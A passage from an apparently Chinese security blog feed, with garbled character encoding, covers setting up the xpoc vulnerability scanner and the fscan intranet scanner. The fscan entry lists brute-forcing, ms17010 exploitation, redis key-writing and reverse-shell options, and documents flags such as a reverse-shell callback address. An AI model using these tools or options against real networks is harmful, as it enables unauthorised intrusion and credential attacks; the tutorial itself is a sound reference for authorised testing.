src="/2025/01/22/gong-fang-gong-ju-ku/xpoc-gong-ying-lian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2010.21.15.png" style="zoom:50%;"><h2 id="2-3-é…ç½®æ–‡ä»¶"><a href="#2-3-é…ç½®æ–‡ä»¶" class="headerlink" title="2.3 é…ç½®æ–‡ä»¶"></a>2.3 é…ç½®æ–‡ä»¶</h2><p>ä¸Šé¢é€”ä¸­æŠ¥é…ç½®æ–‡ä»¶ä¸å­˜åœ¨çš„é”™è¯¯ã€‚</p><p>é…ç½®æ–‡ä»¶åœ¨å®¶ç›®å½•.xaryä¸‹ï¼š</p><img src="/2025/01/22/gong-fang-gong-ju-ku/xpoc-gong-ying-lian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2010.40.38.png" style="zoom:50%;"><p>æ”¹ä¸ªåå­—ï¼š</p><img src="/2025/01/22/gong-fang-gong-ju-ku/xpoc-gong-ying-lian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2010.41.43.png" style="zoom:50%;"><img src="/2025/01/22/gong-fang-gong-ju-ku/xpoc-gong-ying-lian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2010.42.26.png" style="zoom:50%;"><p>æˆåŠŸåŠ è½½äº†æ”¹åä¹‹åçš„é…ç½®æ–‡ä»¶ã€‚</p><h1 id="ä¸‰ã€ä½¿ç”¨æ–¹æ³•"><a href="#ä¸‰ã€ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä¸‰ã€ä½¿ç”¨æ–¹æ³•"></a>ä¸‰ã€ä½¿ç”¨æ–¹æ³•</h1><h2 id="3-1-æ‰«ææŒ‡å®šç›®æ ‡"><a href="#3-1-æ‰«ææŒ‡å®šç›®æ ‡" class="headerlink" title="3.1 æ‰«ææŒ‡å®šç›®æ ‡"></a>3.1 æ‰«ææŒ‡å®šç›®æ ‡</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xpoc <span class="token parameter variable">-t</span> https://example.com <span class="token parameter variable">-o</span> result.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-2-æŸ¥çœ‹æ‰€æœ‰äº‘ç«¯çš„POC"><a href="#3-2-æŸ¥çœ‹æ‰€æœ‰äº‘ç«¯çš„POC" class="headerlink" title="3.2 æŸ¥çœ‹æ‰€æœ‰äº‘ç«¯çš„POC"></a>3.2 æŸ¥çœ‹æ‰€æœ‰äº‘ç«¯çš„POC</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xpoc list <span class="token parameter variable">-a</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/22/gong-fang-gong-ju-ku/xpoc-gong-ying-lian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2010.27.48.png" style="zoom:50%;"><h2 id="3-3-æ‰¹é‡æ‰«æ"><a href="#3-3-æ‰¹é‡æ‰«æ" class="headerlink" title="3.3 æ‰¹é‡æ‰«æ"></a>3.3 æ‰¹é‡æ‰«æ</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xpoc <span class="token operator">&lt;</span> targets.txt<span class="token function">cat</span> targets.txt <span class="token operator">|</span> xpocxpoc <span class="token parameter variable">-i</span> targets.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h2 id="3-4-åŒæ­¥æœ€æ–°æ’ä»¶"><a href="#3-4-åŒæ­¥æœ€æ–°æ’ä»¶" class="headerlink" title="3.4 åŒæ­¥æœ€æ–°æ’ä»¶"></a>3.4 åŒæ­¥æœ€æ–°æ’ä»¶</h2><p>é¦–æ¬¡å¯åŠ¨ä¼šè‡ªåŠ¨è¿›è¡Œä¸€æ¬¡å…¨é‡åŒæ­¥</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xpoc pull<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="3-5-æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬"><a href="#3-5-æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬" class="headerlink" title="3.5 æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬"></a>3.5 æ›´æ–°åˆ°æœ€æ–°ç‰ˆæœ¬</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xpoc upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="å››ã€å®æˆ˜ä½¿ç”¨"><a href="#å››ã€å®æˆ˜ä½¿ç”¨" class="headerlink" title="å››ã€å®æˆ˜ä½¿ç”¨"></a>å››ã€å®æˆ˜ä½¿ç”¨</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">xpoc <span class="token parameter variable">-t</span> http://172.20.10.5:81 <span class="token parameter variable">-o</span> test.html<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/22/gong-fang-gong-ju-ku/xpoc-gong-ying-lian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2010.48.15.png" style="zoom:50%;"><p>ç”¨ä¸èµ·æ¥ï¼ŒåŸå› ä¸æ˜ã€‚</p><p>åŠ è½½xray-pluginsä»“åº“æ’ä»¶ä½¿ç”¨ï¼š</p><img src="/2025/01/22/gong-fang-gong-ju-ku/xpoc-gong-ying-lian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2011.40.35.png" style="zoom:50%;"><p>æ•ˆæœå¾ˆå·®ã€‚</p><img src="/2025/01/22/gong-fang-gong-ju-ku/xpoc-gong-ying-lian-lou-dong-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-22%2011.41.47.png" style="zoom:50%;"><p>æ˜æ˜æŒ‡å®šäº†*.ymlï¼Œä½†æ˜¯å¹¶æ²¡æœ‰èµ·ä½œç”¨ã€‚åŸå› ä¸æ˜ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> æ”»é˜²å·¥å…·åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ”»é˜²å·¥å…·åº“ </tag>
            
            <tag> æ¼æ´æ‰«æ </tag>
            
            <tag> ä¾›åº”é“¾æ¼æ´æ‰«æ </tag>
            
            <tag> ä¾›åº”é“¾å®‰å…¨ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Fscanå†…ç½‘ç»¼åˆæ‰«æå·¥å…·</title>
      <link href="/2025/01/21/gong-fang-gong-ju-ku/fscan-nei-wang-zong-he-sao-miao-gong-ju/"/>
      <url>/2025/01/21/gong-fang-gong-ju-ku/fscan-nei-wang-zong-he-sao-miao-gong-ju/</url>
      
        <content type="html"><![CDATA[<h1 id="ä¸€ã€fscanç®€ä»‹"><a href="#ä¸€ã€fscanç®€ä»‹" class="headerlink" title="ä¸€ã€fscanç®€ä»‹"></a>ä¸€ã€fscanç®€ä»‹</h1><p>fscanæ˜¯ä¸€æ¬¾å†…ç½‘ç»¼åˆæ‰«æå·¥å…·ï¼Œå¯ç”¨äºè‡ªåŠ¨åŒ–ã€å…¨æ–¹ä½æ¼æ‰«æ‰«æã€‚<br>æ”¯æŒä¸»æœºå­˜æ´»æ¢æµ‹ã€ç«¯å£æ‰«æã€å¸¸è§æœåŠ¡çš„çˆ†ç ´ã€ms17010ã€redisæ‰¹é‡å†™å…¬é’¥ã€è®¡åˆ’ä»»åŠ¡åå¼¹shellã€è¯»å–winç½‘å¡ä¿¡æ¯ã€webæŒ‡çº¹è¯†åˆ«ã€webæ¼æ´æ‰«æã€netbiosæ¢æµ‹ã€åŸŸæ§è¯†åˆ«ç­‰åŠŸèƒ½ã€‚</p><p>å·¥å…·åœ°å€ï¼š<a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></p><h1 id="äºŒã€ä¸»è¦åŠŸèƒ½"><a href="#äºŒã€ä¸»è¦åŠŸèƒ½" class="headerlink" title="äºŒã€ä¸»è¦åŠŸèƒ½"></a>äºŒã€ä¸»è¦åŠŸèƒ½</h1><h2 id="2-1-ä¿¡æ¯æœé›†"><a href="#2-1-ä¿¡æ¯æœé›†" class="headerlink" title="2.1 ä¿¡æ¯æœé›†"></a>2.1 ä¿¡æ¯æœé›†</h2><ul><li>å­˜æ´»æ¢æµ‹(icmp)</li><li>ç«¯å£æ‰«æ</li></ul><h2 id="2-2-çˆ†ç ´åŠŸèƒ½"><a href="#2-2-çˆ†ç ´åŠŸèƒ½" class="headerlink" title="2.2 çˆ†ç ´åŠŸèƒ½"></a>2.2 çˆ†ç ´åŠŸèƒ½</h2><ul><li>å„ç±»æœåŠ¡çˆ†ç ´(sshã€smbã€rdpç­‰)</li><li>æ•°æ®åº“å¯†ç çˆ†ç ´(mysqlã€mssqlã€redisã€psqlã€oracleç­‰)</li></ul><h2 id="2-3-ç³»ç»Ÿä¿¡æ¯ã€æ¼æ´æ‰«æ"><a href="#2-3-ç³»ç»Ÿä¿¡æ¯ã€æ¼æ´æ‰«æ" class="headerlink" title="2.3 ç³»ç»Ÿä¿¡æ¯ã€æ¼æ´æ‰«æ:"></a>2.3 ç³»ç»Ÿä¿¡æ¯ã€æ¼æ´æ‰«æ:</h2><ul><li>netbiosæ¢æµ‹ã€åŸŸæ§è¯†åˆ«</li><li>è·å–ç›®æ ‡ç½‘å¡ä¿¡æ¯</li><li>é«˜å±æ¼æ´æ‰«æ(ms17010ç­‰)</li></ul><h2 id="2-4-Webæ¢æµ‹åŠŸèƒ½"><a href="#2-4-Webæ¢æµ‹åŠŸèƒ½" class="headerlink" title="2.4 Webæ¢æµ‹åŠŸèƒ½"></a>2.4 Webæ¢æµ‹åŠŸèƒ½</h2><ul><li>webtitleæ¢æµ‹</li><li>webæŒ‡çº¹è¯†åˆ«(å¸¸è§cmsã€oaæ¡†æ¶ç­‰)</li><li>webæ¼æ´æ‰«æ(weblogicã€st2ç­‰,æ”¯æŒxrayçš„poc)</li></ul><h2 id="2-5-æ¼æ´åˆ©ç”¨"><a href="#2-5-æ¼æ´åˆ©ç”¨" class="headerlink" title="2.5 æ¼æ´åˆ©ç”¨"></a>2.5 æ¼æ´åˆ©ç”¨</h2><ul><li>rediså†™å…¬é’¥æˆ–å†™è®¡åˆ’ä»»åŠ¡</li><li>sshå‘½ä»¤æ‰§è¡Œ</li><li>ms17017åˆ©ç”¨(æ¤å…¥shellcode),å¦‚æ·»åŠ ç”¨æˆ·ç­‰</li></ul><h2 id="2-6-å…¶ä»–åŠŸèƒ½"><a href="#2-6-å…¶ä»–åŠŸèƒ½" class="headerlink" title="2.6 å…¶ä»–åŠŸèƒ½:"></a>2.6 å…¶ä»–åŠŸèƒ½:</h2><ul><li>æ–‡ä»¶ä¿å­˜</li></ul><h1 id="ä¸‰ã€å®‰è£…"><a href="#ä¸‰ã€å®‰è£…" class="headerlink" title="ä¸‰ã€å®‰è£…"></a>ä¸‰ã€å®‰è£…</h1><h2 id="3-1-å®‰è£…-go-ç¯å¢ƒ"><a href="#3-1-å®‰è£…-go-ç¯å¢ƒ" class="headerlink" title="3.1 å®‰è£… go ç¯å¢ƒ"></a>3.1 å®‰è£… go ç¯å¢ƒ</h2><ul><li><a href="https://go.dev/dl/">https://go.dev/dl/</a></li></ul><p>macä¹‹å‰å®‰è£…è¿‡ï¼Œæ²¡æœ‰é‡è£…ã€‚</p><img src="/2025/01/21/gong-fang-gong-ju-ku/fscan-nei-wang-zong-he-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-21%2014.12.20.png" style="zoom:50%;"><h2 id="3-2-git-cloneé¡¹ç›®"><a href="#3-2-git-cloneé¡¹ç›®" class="headerlink" title="3.2 git cloneé¡¹ç›®"></a>3.2 git cloneé¡¹ç›®</h2><ul><li><a href="https://github.com/shadow1ng/fscan">https://github.com/shadow1ng/fscan</a></li></ul><img src="/2025/01/21/gong-fang-gong-ju-ku/fscan-nei-wang-zong-he-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-21%2014.17.45.png" style="zoom:50%;"><h2 id="3-3-ç¼–è¯‘å®‰è£…"><a href="#3-3-ç¼–è¯‘å®‰è£…" class="headerlink" title="3.3 ç¼–è¯‘å®‰è£…"></a>3.3 ç¼–è¯‘å®‰è£…</h2><p>è¿›å…¥fscanç›®å½•æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">go build <span class="token parameter variable">-ldflags</span><span class="token operator">=</span><span class="token string">"-s -w "</span> <span class="token parameter variable">-trimpath</span> main.go<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>æ‰§è¡Œè¿‡ç¨‹ï¼š</p><p>(base)  ~/fscan î‚° î‚  main î‚° go build -ldflags=â€-s -w â€œ -trimpath main.go<br>go: downloading github.com/fatih/color v1.7.0<br>go: downloading golang.org/x/net v0.7.0<br>go: downloading github.com/shadow1ng/goWMIExec v0.0.2<br>go: downloading github.com/denisenkom/go-mssqldb v0.12.3<br>go: downloading github.com/go-sql-driver/mysql v1.8.1<br>go: downloading github.com/jlaffaye/ftp v0.2.0<br>go: downloading github.com/hirochachacha/go-smb2 v1.1.0<br>go: downloading github.com/lib/pq v1.10.9<br>go: downloading github.com/sijms/go-ora/v2 v2.5.29<br>go: downloading github.com/stacktitan/smb v0.0.0-20190531122847-da9a425dceb8<br>go: downloading github.com/shadow1ng/grdp v1.0.3<br>go: downloading golang.org/x/crypto v0.3.0<br>go: downloading golang.org/x/text v0.7.0<br>go: downloading gopkg.in/yaml.v3 v3.0.1<br>go: downloading github.com/google/cel-go v0.13.0<br>go: downloading github.com/satori/go.uuid v1.2.0<br>go: downloading google.golang.org/genproto v0.0.0-20221027153422-115e99e71e1c<br>go: downloading google.golang.org/protobuf v1.28.1<br>go: downloading github.com/mattn/go-isatty v0.0.3<br>go: downloading github.com/mattn/go-colorable v0.0.9<br>go: downloading filippo.io/edwards25519 v1.1.0<br>go: downloading go.uber.org/zap v1.14.0<br>go: downloading github.com/golang-sql/sqlexp v0.1.0<br>go: downloading github.com/huin/asn1ber v0.0.0-20120622192748-af09f62e6358<br>go: downloading github.com/golang-sql/civil v0.0.0-20190719163853-cb61b32ac6fe<br>go: downloading github.com/icodeface/tls v0.0.0-20190904083142-17aec93c60e5<br>go: downloading github.com/lunixbochs/struc v0.0.0-20200707160740-784aaebc1d40<br>go: downloading github.com/hashicorp/errwrap v1.0.0<br>go: downloading github.com/stoewer/go-strcase v1.2.0<br>go: downloading github.com/geoffgarside/ber v1.1.0<br>go: downloading go.uber.org/atomic v1.5.0<br>go: downloading go.uber.org/multierr v1.3.0<br>go: downloading golang.org/x/sys v0.5.0<br>go: downloading github.com/antlr/antlr4/runtime/Go/antlr v1.4.10<br>(base)  ~/fscan î‚° î‚  main î‚°</p></blockquote><blockquote><p>ä¸€äº›TIPSï¼ˆæˆ‘å®‰è£…çš„æ—¶å€™æ²¡æœ‰å‡ºç°ï¼‰</p><ul><li>ç¼–è¯‘æŠ¥é”™ï¼š</li><li>go: github.com/denisenkom/<a href="mailto:go-mssqldb@v0.11.0">go-mssqldb@v0.11.0</a>: Get â€œ<a href="https://proxy.golang.org/github.com/denisenkom/go-mssqldb/@v/v0.11.0.mod">https://proxy.golang.org/github.com/denisenkom/go-mssqldb/@v/v0.11.0.mod</a>â€œ: dial tcp 142.251.42.241:443: i/o timeout</li><li>è§£å†³åŠæ³•ï¼š</li><li>go env -w GOSUMDB=off</li><li>go env -w GOPROXY=<a href="https://goproxy.cn,direct/">https://goproxy.cn,direct</a></li><li>å†æ¬¡æ‰§è¡Œç¼–è¯‘ï¼Œä¼šç”Ÿæˆä¸€ä¸ª mainã€‚è¿™ä¸ª main å³æŸ¥ fscan å¯æ‰§è¡Œæ–‡ä»¶ã€‚</li></ul></blockquote><p>ä¸‹å›¾ä¸­çº¢è‰²çš„<code>main</code>æ–‡ä»¶å³ä¸ºfscançš„å¯æ‰§è¡Œæ–‡ä»¶ã€‚</p><img src="/2025/01/21/gong-fang-gong-ju-ku/fscan-nei-wang-zong-he-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-21%2014.20.52.png" style="zoom:50%;"><h2 id="3-4-é…ç½®ç¯å¢ƒå˜é‡"><a href="#3-4-é…ç½®ç¯å¢ƒå˜é‡" class="headerlink" title="3.4 é…ç½®ç¯å¢ƒå˜é‡"></a>3.4 é…ç½®ç¯å¢ƒå˜é‡</h2><p>å¯ä»¥é…ç½®ä¸€ä¸‹ç¯å¢ƒå˜é‡ï¼Œä½¿å¾—èƒ½ç›´æ¥åœ¨ä»»ä½•ä½ç½®æ‰§è¡Œã€‚</p><p>åœ¨ macOS ä¸Šè®¾ç½®ç¯å¢ƒå˜é‡å¹¶é‡å‘½å <code>main</code> æ–‡ä»¶ä¸º <code>fscan</code>ï¼Œä»¥ä¾¿åœ¨ä»»ä½•ä½ç½®éƒ½å¯ä»¥æ‰§è¡Œ <code>fscan</code> å‘½ä»¤ï¼Œå¯ä»¥æŒ‰ç…§ä»¥ä¸‹æ­¥éª¤æ“ä½œï¼š</p><h3 id="3-4-1-é‡å‘½å-main-æ–‡ä»¶"><a href="#3-4-1-é‡å‘½å-main-æ–‡ä»¶" class="headerlink" title="3.4.1 é‡å‘½å main æ–‡ä»¶"></a>3.4.1 é‡å‘½å <code>main</code> æ–‡ä»¶</h3><p>é¦–å…ˆï¼Œä½ éœ€è¦å°† <code>main</code> æ–‡ä»¶é‡å‘½åä¸º <code>fscan</code>ã€‚æ‰“å¼€ç»ˆç«¯ï¼Œå¯¼èˆªåˆ° <code>fscan</code> ç›®å½•ï¼Œç„¶åæ‰§è¡Œä»¥ä¸‹å‘½ä»¤ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">mv</span> main fscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/01/21/gong-fang-gong-ju-ku/fscan-nei-wang-zong-he-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-21%2014.28.32.png" style="zoom:50%;"><h3 id="3-4-2-è®¾ç½®ç¯å¢ƒå˜é‡"><a href="#3-4-2-è®¾ç½®ç¯å¢ƒå˜é‡" class="headerlink" title="3.4.2 è®¾ç½®ç¯å¢ƒå˜é‡"></a>3.4.2 è®¾ç½®ç¯å¢ƒå˜é‡</h3><p>ä¸ºäº†è®© <code>fscan</code> å‘½ä»¤åœ¨ä»»ä½•ä½ç½®éƒ½èƒ½è¢«æ‰§è¡Œï¼Œä½ éœ€è¦å°†å…¶æ·»åŠ åˆ°ç¯å¢ƒå˜é‡ <code>PATH</code> ä¸­ã€‚ä½ å¯ä»¥é€‰æ‹©å°†å…¶æ·»åŠ åˆ° <code>PATH</code> çš„å…¨å±€ä½ç½®ï¼Œä¾‹å¦‚ <code>/usr/local/bin</code>ï¼Œæˆ–è€…å°†å…¶æ·»åŠ åˆ°ä½ çš„ç”¨æˆ·é…ç½®æ–‡ä»¶ä¸­ã€‚</p><h4 id="1ï¼‰æ–¹æ³•ä¸€ï¼šæ·»åŠ åˆ°-usr-local-bin"><a href="#1ï¼‰æ–¹æ³•ä¸€ï¼šæ·»åŠ åˆ°-usr-local-bin" class="headerlink" title="1ï¼‰æ–¹æ³•ä¸€ï¼šæ·»åŠ åˆ° /usr/local/bin"></a>1ï¼‰æ–¹æ³•ä¸€ï¼šæ·»åŠ åˆ° <code>/usr/local/bin</code></h4><ol><li><p>å°† <code>fscan</code> æ–‡ä»¶ç§»åŠ¨åˆ° <code>/usr/local/bin</code> ç›®å½•ï¼š</p><p>bashå¤åˆ¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">mv</span> fscan /usr/local/bin/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¾“å…¥ä½ çš„ç®¡ç†å‘˜å¯†ç ä»¥æˆæƒç§»åŠ¨æ–‡ä»¶ã€‚</p></li><li><p>éªŒè¯ <code>fscan</code> æ˜¯å¦å¯ä»¥åœ¨ä»»ä½•ä½ç½®æ‰§è¡Œï¼š</p><p>bashå¤åˆ¶</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fscan <span class="token parameter variable">-h</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœçœ‹åˆ°å¸®åŠ©ä¿¡æ¯ï¼Œè¯´æ˜è®¾ç½®æˆåŠŸã€‚</p></li></ol><h4 id="2ï¼‰æ–¹æ³•äºŒï¼šæ·»åŠ åˆ°ç”¨æˆ·é…ç½®æ–‡ä»¶"><a href="#2ï¼‰æ–¹æ³•äºŒï¼šæ·»åŠ åˆ°ç”¨æˆ·é…ç½®æ–‡ä»¶" class="headerlink" title="2ï¼‰æ–¹æ³•äºŒï¼šæ·»åŠ åˆ°ç”¨æˆ·é…ç½®æ–‡ä»¶"></a>2ï¼‰æ–¹æ³•äºŒï¼šæ·»åŠ åˆ°ç”¨æˆ·é…ç½®æ–‡ä»¶</h4><ul><li>æ‰“å¼€shellé…ç½®æ–‡ä»¶</li></ul><p>æ‰“å¼€ä½ çš„ shell é…ç½®æ–‡ä»¶ï¼Œä¾‹å¦‚ <code>.bashrc</code> æˆ– <code>.zshrc</code>ï¼ˆå–å†³äºä½ ä½¿ç”¨çš„ shellï¼‰ã€‚</p><p>åœ¨ç»ˆç«¯æ‰§è¡Œ<code>echo $SHELL</code>åˆ¤æ–­è‡ªå·±çš„shellæ˜¯ä»€ä¹ˆç±»å‹ã€‚</p><img src="/2025/01/21/gong-fang-gong-ju-ku/fscan-nei-wang-zong-he-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-21%2014.33.56.png" style="zoom:50%;"><p>å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ Bashï¼Œå¯ä»¥æ‰§è¡Œï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">open</span> <span class="token parameter variable">-e</span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœä½ ä½¿ç”¨çš„æ˜¯ Zshï¼Œå¯ä»¥æ‰§è¡Œï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">open</span> <span class="token parameter variable">-e</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æˆ–è€…ç”¨vimæ‰“å¼€ä¹Ÿå¯ä»¥ã€‚</p><ul><li><p>åœ¨é…ç½®æ–‡ä»¶çš„æœ«å°¾æ·»åŠ ä»¥ä¸‹è¡Œ</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">export</span> <span class="token assign-left variable"><span class="token environment constant">PATH</span></span><span class="token operator">=</span><span class="token string">"<span class="token environment constant">$PATH</span>:/path/to/fscan"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å°† <code>/path/to/fscan</code> æ›¿æ¢ä¸º <code>fscan</code> æ–‡ä»¶çš„å®é™…è·¯å¾„ã€‚</p><p>æˆ‘è¿™é‡Œæ˜¯ï¼š<code>~/fscan</code></p></li></ul><img src="/2025/01/21/gong-fang-gong-ju-ku/fscan-nei-wang-zong-he-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-21%2014.36.42.png" style="zoom:50%;"><p>âš ï¸ï¼šåé¢éªŒè¯äº†ä¸€ä¸‹æˆ‘è¿™è¾¹è¿™æ ·é…ç½®ä¸è¡Œï¼Œæ”¹æˆç»å¯¹è·¯å¾„<code>/Users/ç”¨æˆ·å/fscan</code>ä¹‹åéªŒè¯æˆåŠŸã€‚</p><ul><li>ä¿å­˜å¹¶å…³é—­é…ç½®æ–‡ä»¶,ä½¿æ›´æ”¹ç”Ÿæ•ˆï¼š</li></ul><p>å¯¹äº Bashï¼Œæ‰§è¡Œï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¯¹äº Zshï¼Œæ‰§è¡Œï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>éªŒè¯ <code>fscan</code> æ˜¯å¦å¯ä»¥åœ¨ä»»ä½•ä½ç½®æ‰§è¡Œï¼š</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fscan <span class="token parameter variable">-h</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å¦‚æœçœ‹åˆ°å¸®åŠ©ä¿¡æ¯ï¼Œè¯´æ˜è®¾ç½®æˆåŠŸã€‚</p><img src="/2025/01/21/gong-fang-gong-ju-ku/fscan-nei-wang-zong-he-sao-miao-gong-ju/%E6%88%AA%E5%B1%8F2025-01-21%2014.41.14.png" style="zoom:50%;"><p>é…ç½®æˆåŠŸã€‚</p><h1 id="å››ã€å‚æ•°"><a href="#å››ã€å‚æ•°" class="headerlink" title="å››ã€å‚æ•°"></a>å››ã€å‚æ•°</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token parameter variable">-c</span> string      sshå‘½ä»¤æ‰§è¡Œ<span class="token parameter variable">-cookie</span> string      è®¾ç½®cookie<span class="token parameter variable">-debug</span> int      å¤šä¹…æ²¡å“åº”,å°±æ‰“å°å½“å‰è¿›åº¦<span class="token punctuation">(</span>default <span class="token number">60</span><span class="token punctuation">)</span><span class="token parameter variable">-domain</span> string      smbçˆ†ç ´æ¨¡å—æ—¶,è®¾ç½®åŸŸå<span class="token parameter variable">-h</span> string      ç›®æ ‡ip: <span class="token number">192.168</span>.11.11 <span class="token operator">|</span> <span class="token number">192.168</span>.11.11-255 <span class="token operator">|</span> <span class="token number">192.168</span>.11.11,192.168.11.12<span class="token parameter variable">-hf</span> string      è¯»å–æ–‡ä»¶ä¸­çš„ç›®æ ‡<span class="token parameter variable">-hn</span> string      æ‰«ææ—¶,è¦è·³è¿‡çš„ip: <span class="token parameter variable">-hn</span> <span class="token number">192.168</span>.1.1/24<span class="token parameter variable">-m</span> string      è®¾ç½®æ‰«ææ¨¡å¼: <span class="token parameter variable">-m</span> <span class="token function">ssh</span> <span class="token punctuation">(</span>default <span class="token string">"all"</span><span class="token punctuation">)</span><span class="token parameter variable">-no</span>      æ‰«æç»“æœä¸ä¿å­˜åˆ°æ–‡ä»¶ä¸­<span class="token parameter variable">-nobr</span>      è·³è¿‡sqlã€ftpã€sshç­‰çš„å¯†ç çˆ†ç ´<span class="token parameter variable">-nopoc</span>      è·³è¿‡web pocæ‰«æ<span class="token parameter variable">-np</span>      è·³è¿‡å­˜æ´»æ¢æµ‹<span class="token parameter variable">-num</span> int      web poc å‘åŒ…é€Ÿç‡  <span class="token punctuation">(</span>default <span class="token number">20</span><span class="token punctuation">)</span><span class="token parameter variable">-o</span> string      æ‰«æç»“æœä¿å­˜åˆ°å“ª <span class="token punctuation">(</span>default <span class="token string">"result.txt"</span><span class="token punctuation">)</span><span class="token parameter variable">-p</span> string      è®¾ç½®æ‰«æçš„ç«¯å£: <span class="token number">22</span> <span class="token operator">|</span> <span class="token number">1</span>-65535 <span class="token operator">|</span> <span class="token number">22,80</span>,3306 <span class="token punctuation">(</span>default <span class="token string">"21,22,80,81,135,139,443,445,1433,3306,5432,6379,7001,8000,8080,8089,9000,9200,11211,27017"</span><span class="token punctuation">)</span><span class="token parameter variable">-pa</span> string      æ–°å¢éœ€è¦æ‰«æçš„ç«¯å£,-pa <span class="token number">3389</span> <span class="token punctuation">(</span>ä¼šåœ¨åŸæœ‰ç«¯å£åˆ—è¡¨åŸºç¡€ä¸Š,æ–°å¢è¯¥ç«¯å£<span class="token punctuation">)</span><span class="token parameter variable">-path</span> string      fcgiã€smb romote <span class="token function">file</span> path<span class="token parameter variable">-ping</span>      ä½¿ç”¨pingä»£æ›¿icmpè¿›è¡Œå­˜æ´»æ¢æµ‹<span class="token parameter variable">-pn</span> string      æ‰«ææ—¶è¦è·³è¿‡çš„ç«¯å£,as: <span class="token parameter variable">-pn</span> <span class="token number">445</span><span class="token parameter variable">-pocname</span> string      æŒ‡å®šweb pocçš„æ¨¡ç³Šåå­—, <span class="token parameter variable">-pocname</span> weblogic<span class="token parameter variable">-proxy</span> string      è®¾ç½®ä»£ç†, <span class="token parameter variable">-proxy</span> http://127.0.0.1:8080<span class="token parameter variable">-user</span> string      æŒ‡å®šçˆ†ç ´æ—¶çš„ç”¨æˆ·å<span class="token parameter variable">-userf</span> string      æŒ‡å®šçˆ†ç ´æ—¶çš„ç”¨æˆ·åæ–‡ä»¶<span class="token parameter variable">-pwd</span> string      æŒ‡å®šçˆ†ç ´æ—¶çš„å¯†ç <span class="token parameter variable">-pwdf</span> string      æŒ‡å®šçˆ†ç ´æ—¶çš„å¯†ç æ–‡ä»¶<span class="token parameter variable">-rf</span> string      æŒ‡å®šrediså†™å…¬é’¥ç”¨æ¨¡å—çš„æ–‡ä»¶ <span class="token punctuation">(</span>as: <span class="token parameter variable">-rf</span> id_rsa.pub<span class="token punctuation">)</span><span class="token parameter variable">-rs</span> string      redisè®¡åˆ’ä»»åŠ¡åå¼¹shellçš„ipç«¯å£ <span class="token punctuation">(</span>as: <span class="token parameter variable">-rs</span> <span class="token number">192.168</span>.1.1:6666<span class="token punctuation">)</span><span class="token parameter variable">-silent</span>      é™é»˜æ‰«æ,é€‚åˆcsæ‰«ææ—¶ä¸å›æ˜¾<span class="token parameter 